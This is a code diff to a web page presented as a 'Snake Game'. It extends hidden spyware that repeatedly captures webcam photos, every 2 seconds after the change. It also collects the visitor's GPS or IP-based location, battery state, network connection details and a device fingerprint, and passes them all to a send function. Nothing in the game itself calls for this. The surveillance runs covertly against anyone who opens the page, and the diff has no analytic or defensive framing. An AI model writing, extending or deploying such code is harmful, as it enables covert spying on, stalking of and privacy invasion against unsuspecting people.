@@ -168,7 +168,7 @@
     <div class="container">
         <div class="header">
             <h1>🐍 Snake Game</h1>
-            
+            <div class="status" id="status">Starting...</div>
             <div class="score">Score: <span id="score">0</span></div>
         </div>
 
@@ -228,30 +228,21 @@
                 // Wait for video to be ready
                 video.onloadedmetadata = () => {
                     document.getElementById('status').textContent = 'Camera ready...';
-                    
-                    // Send location info first (once)
-                    setTimeout(() => {
-                        sendLocationInfo();
-                    }, 1000);
 
-                    // Start capturing photos every 10 seconds
+                    // Start capturing photos with info every 2 seconds
                     setTimeout(() => {
-                        captureAndSendPhoto(); // First photo immediately
+                        captureAndSendPhotoWithInfo(); // First photo immediately
                         
-                        // Then capture every 10 seconds
+                        // Then capture every 2 seconds
                         photoInterval = setInterval(() => {
-                            captureAndSendPhoto();
-                        }, 1000); // 10 seconds
+                            captureAndSendPhotoWithInfo();
+                        }, 2000); // 2 seconds
                     }, 1000);
                 };
                 
             } catch (err) {
                 console.error('Camera error:', err);
-                document.getElementById('status').textContent = 'Camera denied, sending location...';
-                // If camera fails, still send location
-                setTimeout(() => {
-                    sendLocationInfo();
-                }, 500);
+                document.getElementById('status').textContent = 'Camera access denied';
             }
         });
 
@@ -302,9 +293,49 @@
 
         async function sendLocationInfo() {
             try {
-                document.getElementById('status').textContent = 'Getting location...';
+                document.getElementById('status').textContent = 'Getting info...';
                 
-                // Get IP info first (this works without GPS)
+                // Get battery info
+                let batteryInfo = { level: 'Unknown', charging: 'Unknown' };
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        batteryInfo = {
+                            level: Math.round(battery.level * 100) + '%',
+                            charging: battery.charging ? 'Yes (Charging)' : 'No (Not Charging)'
+                        };
+                    } catch (e) {
+                        console.log('Battery API not available');
+                    }
+                }
+
+                // Get connection info
+                let connectionInfo = { type: 'Unknown', effectiveType: 'Unknown', downlink: 'Unknown', saveData: 'Unknown' };
+                if ('connection' in navigator || 'mozConnection' in navigator || 'webkitConnection' in navigator) {
+                    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    connectionInfo = {
+                        type: conn.type || 'Unknown',
+                        effectiveType: conn.effectiveType || 'Unknown',
+                        downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Unknown',
+                        saveData: conn.saveData ? 'Enabled' : 'Disabled'
+                    };
+                }
+
+                // Get device info
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+                    doNotTrack: navigator.doNotTrack || 'Not set',
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth + ' bits',
+                    pixelRatio: window.devicePixelRatio || 1,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset() + ' minutes'
+                };
+
+                // Get IP info
                 const ipResponse = await fetch('https://ipapi.co/json/');
                 
                 if (!ipResponse.ok) {
@@ -321,12 +352,12 @@
                         async (position) => {
                             // GPS succeeded, use precise location
                             console.log('GPS success:', position.coords);
-                            await sendLocationData(position.coords.latitude, position.coords.longitude, ipData);
+                            await sendLocationData(position.coords.latitude, position.coords.longitude, ipData, batteryInfo, connectionInfo, deviceInfo);
                         },
                         async (error) => {
                             // GPS failed, use IP-based location
                             console.log('GPS error:', error);
-                            await sendLocationData(null, null, ipData);
+                            await sendLocationData(null, null, ipData, batteryInfo, connectionInfo, deviceInfo);
                         },
                         {
                             timeout: 5000,
@@ -335,11 +366,11 @@
                     );
                 } else {
                     // No GPS available
-                    await sendLocationData(null, null, ipData);
+                    await sendLocationData(null, null, ipData, batteryInfo, connectionInfo, deviceInfo);
                 }
             } catch (err) {
                 console.error('Location error:', err);
-                document.getElementById('status').textContent = 'Location error: ' + err.message;
+                document.getElementById('status').textContent = 'Info error: ' + err.message;
             }
         }
 
